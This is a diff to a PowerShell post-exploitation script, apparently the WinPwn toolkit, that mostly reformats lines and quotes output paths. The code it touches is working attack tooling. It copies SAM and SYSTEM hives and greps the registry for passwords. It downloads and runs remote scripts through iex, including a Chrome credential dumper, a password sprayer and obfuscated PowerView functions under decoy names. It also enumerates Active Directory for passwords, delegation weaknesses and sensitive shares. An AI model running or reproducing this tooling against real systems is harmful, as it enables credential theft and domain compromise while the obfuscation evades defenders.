@@ -346,20 +346,14 @@ function localreconmodules
             }
             
             # Collecting more information
-            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP')
-            {
-                Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"
-            }            
-            If (Test-Path -Path %SYSTEMROOT%\repair\SAM)
-            {
-                Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"
-            }
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM";}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
-            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\LocalRecon\SYS";}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS";}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS";}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
+            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\LocalRecon\SYS"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS"}
 
             REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
             REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
@@ -436,6 +430,7 @@ function localreconmodules
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-ChromeDump.ps1')
+                Install-SqlLiteAssembly
                 Get-ChromeDump >> "$currentPath\LocalRecon\Chromecredentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                 Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
@@ -454,7 +449,7 @@ function jaws
             pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             Write-Host -ForegroundColor Yellow 'Executing Just Another Windows (Enum) Script:'
-            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/jaws-enum.ps1' -Outfile $currentPath\LocalPrivesc\JAWS.ps1
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/jaws-enum.ps1' -Outfile "$currentPath\LocalPrivesc\JAWS.ps1"
             Invoke-expression 'cmd /c start powershell -Command {powershell.exe -ExecutionPolicy Bypass -File .\LocalPrivesc\JAWS.ps1 -OutputFilename JAWS-Enum.txt}'
 
 }
@@ -472,72 +467,73 @@ function domainreconmodules
             pathcheck
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
-            $domain_Name = Get-NetDomain
+            $domain_Name = skulked
             $Domain = $domain_Name.Name
 
             Write-Host -ForegroundColor Yellow 'Starting Domain Recon phase:'
 
             Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
-            Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt
+            Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii "$currentPath\DomainRecon\userlist.txt"
             
             Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
-            inset >> $currentPath\DomainRecon\ExploitableSystems.txt
+            inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"
 
             ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
             ## TODO https://github.com/canix1/ADACLScanner 
 
             #Powerview
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
-            skulked >> $currentPath\DomainRecon\NetDomain.txt
-            televisions >> $currentPath\DomainRecon\NetForest.txt
-            misdirects >> $currentPath\DomainRecon\NetForestDomain.txt      
-            odometer >> $currentPath\DomainRecon\NetDomainController.txt  
-            Houyhnhnm >> $currentPath\DomainRecon\NetUser    
-            Randal >> $currentPath\DomainRecon\NetSystems.txt   
-            Get-Printer >> $currentPath\DomainRecon\NetPrinter.txt
-            damsels >> $currentPath\DomainRecon\NetOU.txt    
-            xylophone >> $currentPath\DomainRecon\NetSite.txt  
-            ignominies >> $currentPath\DomainRecon\NetSubnet.txt
-            reapportioned >> $currentPath\DomainRecon\NetGroup.txt 
-            confessedly >> $currentPath\DomainRecon\NetGroupMember.txt   
-            aqueduct >> $currentPath\DomainRecon\NetFileServer.txt 
-            marinated >> $currentPath\DomainRecon\DFSshare.txt 
-            merchandising >> $currentPath\DomainRecon\DFSsharev1.txt
-            visible >> $currentPath\DomainRecon\DFSsharev2.txt
-            liberation >> $currentPath\DomainRecon\NetShare.txt 
-            cherubs >> $currentPath\DomainRecon\NetLoggedon
-            Trojans >> $currentPath\DomainRecon\Domaintrusts.txt
-            sequined >> $currentPath\DomainRecon\ForestTrust.txt
-            ringer >> $currentPath\DomainRecon\ForeignUser.txt
-            condor >> $currentPath\DomainRecon\ForeignGroup.txt
+            skulked >> "$currentPath\DomainRecon\NetDomain.txt"
+            televisions >> "$currentPath\DomainRecon\NetForest.txt"
+            misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
+            odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
+            Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
+            Randal >> "$currentPath\DomainRecon\NetSystems.txt"   
+            Get-Printer >> "$currentPath\DomainRecon\NetPrinter.txt"
+            damsels >> "$currentPath\DomainRecon\NetOU.txt"    
+            xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
+            ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
+            reapportioned >> "$currentPath\DomainRecon\NetGroup.txt" 
+            confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
+            aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
+            marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
+            merchandising >> "$currentPath\DomainRecon\DFSsharev1.txt"
+            visible >> "$currentPath\DomainRecon\DFSsharev2.txt"
+            liberation >> "$currentPath\DomainRecon\NetShare.txt" 
+            cherubs >> "$currentPath\DomainRecon\NetLoggedon"
+            Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
+            sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
+            ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
+            condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
 	    
-        #Search for AD-Passwords in description fields
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile $currentPath\Microsoft.ActiveDirectory.Management.dll
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
-        thyme >> $currentPath\DomainRecon\Passwords_in_description.txt
+            #Search for AD-Passwords in description fields
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
+            thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
-	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
-	    $Date = (Get-Date).AddYears(-1).ToFileTime()
-        noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
-	    
-	    noshes -RmrzVOkRggEzAyC "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -wDpWXLYTGZrAWN9 distinguishedname
-            noshes -UACFilter NOT_ACCOUNTDISABLE -wDpWXLYTGZrAWN9 distinguishedname >> $currentPath\DomainRecon\Enabled_Users.txt
-	    
-	    $Computers = eigenvalues -Ku9ZmWgd9fLSPTw >> $currentPath\DomainRecon\Unconstrained_Systems.txt
-            $Users = noshes -ppACfvFXyx9fpzx -SkNLjyYBJxqKTQ9 >> $currentPath\DomainRecon\UnconstrainedDelegationUsers.txt
-	    
-	    $DomainPolicy = ablaze -Tj9sqOWMRhlsjX9 Domain
-            $DomainPolicy.KerberosPolicy >> $currentPath\DomainRecon\Kerberospolicy.txt
-            $DomainPolicy.SystemAccess >> $currentPath\DomainRecon\Passwordpolicy.txt
-	    
-	    bustling -WPxsp9KIBMFyVPQ -n9gorCgPlTjDyXn RDP >> $currentPath\DomainRecon\RDPAccess_Systems.txt 
-	    
-	    $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain shares - can take a while? (yes/no)'
+	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
+	        $Date = (Get-Date).AddYears(-1).ToFileTime()
+            noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
+	        
+	        noshes -RmrzVOkRggEzAyC "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -wDpWXLYTGZrAWN9 distinguishedname
+            noshes -UACFilter NOT_ACCOUNTDISABLE -wDpWXLYTGZrAWN9 distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
+	        
+	        $Computers = eigenvalues -Ku9ZmWgd9fLSPTw >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
+            $Users = noshes -ppACfvFXyx9fpzx -SkNLjyYBJxqKTQ9 >> "$currentPath\DomainRecon\UnconstrainedDelegationUsers.txt"
+	        
+	        $DomainPolicy = ablaze -Tj9sqOWMRhlsjX9 Domain
+            $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
+            $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
+	        
+	        bustling -WPxsp9KIBMFyVPQ -n9gorCgPlTjDyXn RDP >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+	        
+	        $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain shares - can take a while? (yes/no)'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
-	    	replaced >> $currentPath\DomainRecon\InterestingDomainshares.txt
-	    }
+	        	replaced >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
+	        }
+            
             $aclight = Read-Host -Prompt 'Starting ACLAnalysis for Shadow Admin detection? (yes/no)'
             if ($aclight -eq "yes" -or $aclight -eq "y" -or $aclight -eq "Yes" -or $aclight -eq "Y")
             {
@@ -547,7 +543,7 @@ function domainreconmodules
 	        }
             
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
-            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile $currentPath\DomainRecon\ADrecon\recon.ps1
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
             Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
             invoke-expression 'cmd /c start powershell -Command {.\DomainRecon\ADrecon\recon.ps1}'
 }
